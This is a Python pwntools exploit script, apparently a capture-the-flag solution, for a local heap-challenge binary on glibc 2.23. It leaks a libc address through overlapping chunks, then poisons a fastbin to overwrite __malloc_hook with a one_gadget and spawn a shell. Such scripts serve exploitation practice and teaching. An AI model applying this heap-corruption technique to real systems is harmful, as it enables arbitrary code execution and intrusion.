from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./heap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./heap")
else:
	pass

def add(size,content,large=True):
	p.sendafter("> ","1")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")
	p.sendlineafter("length: ",str(size))
	p.sendafter("words: ",content)

def show(large = True):
	p.sendafter("> ","4")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")

def free(large = True):
	p.sendafter("> ","2")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")

def edit(content,large = True):
	p.sendafter("> ","3")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")
	p.sendafter("words: ",content)

def debugf():
	gdb.attach(p,"b *0x400E9B")

context.log_level = "debug"
add(0x10,"a",False)
add(0x100,"b",True)
free(False)
add(0x50,"c",False)
free(False)
add(0x10,"d",False)
free(True)
payload = "e"*0x10 + "f"*0x10
edit(payload,False)
show(False)
p.recvuntil("f"*0x10)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
payload = "e"*0x10 + p64(0) + p64(0x111)
edit(payload,False)
#debugf()
free(False)
add(0x100,"h",True)
add(0x60,"g",False)
free(False)
free(True)
add(0x50,"h",True)
target = libc.symbols["__malloc_hook"] - 0x23
#target = 0x602060 + 5
payload = "a"*0x50 + p64(0) + p64(0x71) + p64(target)
edit(payload,True)
free(True)
add(0x60,"a",True)
one_gadget = libc.address + 0xf02a4
payload = "aaa" + p64(0) + p64(one_gadget) + p64(one_gadget)
add(0x60,payload,False)
free(True)
free(False)
#debugf()
#p.sendafter("> ","1")
#p.sendafter("> ","2")
#p.sendlineafter("length: ","0")
p.interactive()
